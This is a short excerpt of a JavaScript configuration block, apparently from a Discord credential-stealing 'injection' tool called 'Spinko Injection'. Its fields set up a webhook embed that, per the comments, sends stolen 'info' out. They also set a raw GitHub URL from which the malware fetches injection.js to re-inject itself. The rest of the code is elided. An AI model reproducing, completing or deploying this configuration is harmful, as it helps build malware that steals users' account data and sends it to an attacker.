...
const config = {
  ...
  embed_name: 'Spinko Injection', //name of the webhook thats gonna send the info
  embed_icon: 'https://marscode.s3.eu-north-1.amazonaws.com/assets/img/nft/1625488718036.gif'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/king2022new/injection/main/injection.js', //injection url for when it reinjects
  /**
